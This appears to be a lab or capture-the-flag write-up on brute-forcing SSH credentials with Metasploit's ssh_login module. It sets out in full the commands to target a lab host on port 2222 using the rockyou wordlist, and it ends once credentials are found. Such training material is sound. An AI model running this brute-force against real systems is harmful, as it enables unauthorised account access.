# Metasploit - SSH Brute Force Enumeration

## Objective

The goal of this task was to:

* Discover valid SSH credentials using Metasploit auxiliary modules
* Access the target system via SSH
* Locate and read a flag file in a user directory

---

## Target Information

* Target host: 192.168.219.201
* SSH port: 2222 (non-standard port)
* Target user: george

---

## Initial Setup

Started the Metasploit Framework:

msfconsole

---

## Using the SSH Login Module

Selected the SSH brute-force module:

use auxiliary/scanner/ssh/ssh_login

This module is used to test username and password combinations against an SSH service.

---

## Module Configuration

Configured the required options:

set RHOSTS 192.168.219.201
set RPORT 2222
set USERNAME george
set PASS_FILE /usr/share/wordlists/rockyou.txt

Verified configuration:

show options

---

## Running the Attack

Executed the module:

run

The module attempted multiple password combinations and identified valid credentials.

---

